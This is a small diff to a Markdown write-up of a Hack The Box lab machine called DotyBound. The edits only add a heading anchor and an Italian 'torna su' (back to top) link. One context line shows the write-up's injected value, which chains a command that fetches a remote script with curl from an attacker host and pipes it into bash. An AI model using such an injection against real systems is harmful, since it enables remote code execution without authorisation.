@@ -1,5 +1,5 @@
 ---
-# WriteUp DotyBound (HTB) 
+# WriteUp DotyBound (HTB) {#WriteUp DotyBound}
 ---
 - [X]  **Discovered port and service with `nmap`**
 
@@ -172,3 +172,5 @@ true;curl -s http://10.10.X.X:8000/run.sh|bash;#,1,1
 ```
 
 </details>
+
+[torna su](#WriteUp DotyBound)
